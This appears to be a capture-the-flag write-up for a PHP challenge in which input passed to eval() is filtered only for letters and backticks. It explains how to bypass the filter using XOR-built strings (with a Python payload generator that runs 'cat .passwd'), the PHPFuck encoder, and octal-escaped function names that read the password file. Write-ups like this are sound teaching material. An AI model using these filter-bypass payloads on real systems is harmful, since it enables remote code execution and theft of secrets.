
**Non-alphanumeric PHP code**

Note : the flag is in .passwd file.


```php
<?php
    
if (isset($_POST['input'])) {
    if(!preg_match('/[a-zA-Z`]/', $_POST['input'])){
        print '<fieldset><legend>Result</legend>';
        eval('print '.$_POST['input'].";");
        print '</fieldset>';
    }
    else
        echo "<p>Dangerous code detected</p>";
}
?>
```

This challenge use `eval()` function, but filter all the word.


There are several ways to solve the challenge

My first method was to use `xor` operation to insert word in the challenge

Eg: `(',' ^ '@').('(' ^ '[')` return the string `ls`

The challenge block a few specific characters beside words, and these chars `(`, `)`, `.` don't need to use xor.

There are several ways to call a function in PHP.

-    function(). This is the most common way.
-    $variable = “functionName”; $variable();
-    (**functionname**)(**functioncontent**)

The first and second method didn't work. We want to call the PHP legacy function.
```py
def find_xor_pairs(target_char):
    target_value = ord(target_char)
    valid_pairs = []
    blacklist = ['\\', '`','^','\'']
    for i in range(32, 127):  
        for j in range(32, 127):
            if chr(i).isalpha() or chr(j).isalpha():
                continue 
            if chr(i) in blacklist or chr(j) in blacklist:
                continue
            if (i ^ j) == target_value:
                valid_pairs.append((i, j))
    
    return valid_pairs

def xor(command):
    payload = []
    for char in command:
        if char == "(" or char == ")" or char == ".":
            payload.append(f"('{char}')")
            continue
        pairs = find_xor_pairs(char)
        if pairs:
            pair = pairs[0]
            payload.append(f"('{chr(pair[0])}'^'{chr(pair[1])}')")
    return '.'.join(payload)
        
command1 = 'system'
command2 = 'cat .passwd'
print(f"({xor(command1)})({xor(command2)})")
```

The second way is to use [PHPFuck](https://github.com/splitline/PHPFuck), this one is pretty straight foward.

The third way is to use octal encoding
```
"\146\151\154\145\137\147\145\164\137\143\157\156\164\145\156\164\163"("\56\160\141\163\163\167\144")
```